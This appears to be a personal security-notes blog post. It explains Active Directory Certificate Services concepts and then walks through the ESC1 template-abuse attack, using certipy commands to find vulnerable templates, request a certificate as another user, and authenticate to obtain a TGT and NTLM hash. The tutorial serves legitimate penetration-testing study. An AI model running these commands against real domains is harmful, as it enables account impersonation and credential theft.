---
title: ADCS - Active Directory Certificate Services
layout: post
date: 2025-05-13
description: "Active Directory Certificate Services (ADCS) is a Microsoft server role that provides customizable services for creating and managing public key certificates used in software security systems."
permalink: /theory/windows/AD/adcs/
---

## Overview
Active Directory Certificate Services (ADCS) is a Microsoft server role that provides customizable services for creating and managing public key certificates used in software security systems. It is part of the Windows Server operating system and is used to create a public key infrastructure (PKI) that can be used to secure communications, authenticate users, and encrypt data.

ADCS allows organizations to issue and manage digital certificates, which are used to verify the identity of users, devices, and services.

## ADCS Terms

### Certificates

A digital certificate is an electronic document used to prove the ownership of a public key. It contains information about the key, the identity of its owner (the subject), and the digital signature of an entity that has verified the certificate's contents, usually a trusted third party known as a Certificate Authority (CA).

It is a `X-509-formatted` file that contains the following information:
- **Subject**: The entity that the certificate represents (e.g., a user, device, or service).
- **Public Key**: The public key associated with the subject.
- **Not Before** and **Not After**: The validity period of the certificate.
- **Issuer**: The entity that issued the certificate (usually a CA).
- **Serial Number**: A unique identifier for the certificate.
- **Subject Alternative Name (SAN)**: Additional identities associated with the certificate (e.g., DNS names, IP addresses).
- **Basic Constraints**: Indicates whether the certificate can be used as a CA certificate or an end-entity certificate.
- **Extended Key Usage**: Specifies the purposes for which the certificate can be used (e.g., server authentication, client authentication, code signing).
- **Signature Algorithm**: The algorithm used to sign the certificate.



### Certificate Authority (CA)

A Certificate Authority (CA) is a trusted entity that issues digital certificates. The CA verifies the identity of the entity requesting the certificate and signs the certificate with its private key. This process ensures that the certificate can be trusted by other entities.

The root CA certificate is the top-level certificate in a certificate hierarchy. It is self-signed and serves as the trust anchor for all other certificates issued by the CA.

ADCS stores trusted root CA in four locations under the container `CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=com`:
- `Certification Authorities container`: Defines top-tier root CA certificates
- `Enrolment Services container`: Encapsulates key attributes such as pKIEnrollmentService objectClass, cACertificate data, dNSHostName and certificateTemplates
- `NTAuthCertificates AD object`: Contains cACertificate properties defining a series of trusted CA certificates
- `AIA (Authority Information Access) container`: Aids in validating certificate chains

### Certificate Templates

Certificate templates are used to establish certificate properties and settings for different types of certificates, that include enrolment policies, key usage, and security settings. They define the attributes and constraints of the certificates issued by a CA.


## ADCS Attacks

### ESC1

The ESC1 attack is a method used to exploit the Active Directory Certificate Services (ADCS) to issue certificates for any user or computer account in the domain. This attack takes advantage of the fact that ADCS does not enforce strict access controls on certificate templates, allowing an attacker to request a certificate for any account.

#### ESC1 Requirements
- Low-privileged users with enrollment permissions on a certificate template
- Manager approval should be turned off 
- No authorized signatures are required
- The certificate template must be configured to allow the user to request a certificate for any account
- Certificate template allows requesters to specify a `subjectAltName(SAN)` in the `CSR` (Certificate Signing Request)

#### ESC1 Steps

**Enumeration**

```bash
certipy find -u 'mhijuxs@sw4.local' -p 'Password123!' -dc-ip <DC-IP> -vulnerable -stdout
```
> Command breakdown:
> - `certipy find`: Find vulnerable certificate templates
> - `-u`: User to authenticate as
> - `-p`: Password for the user
> - `-dc-ip`: IP address of the domain controller 
> - `-vulnerable`: Output only vulnerable certificate templates
> - `-stdout`: Output to standard output
{: .prompt-info}

**Requesting Certificate**

```bash
certipy req -u 'mhijuxs@sw4.local' -p 'Password123!' -dc-ip <DC-IP> -ca <CA> -template <VulnerableTemplate> -upn <TargetUser> 
```

**Authenticating with the Certificate**

```bash
certipy auth -pfx <Certificate.pfx> -user <TargetUser> -dc-ip <DC-IP>
```

After that, we receive a `TGT` and the user's `NTLM` hash.

## References

- [Hack the Box - ADCS](https://www.academy.hackthebox.com)
- [Certified Pre-Owned SpecterOps](https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf)

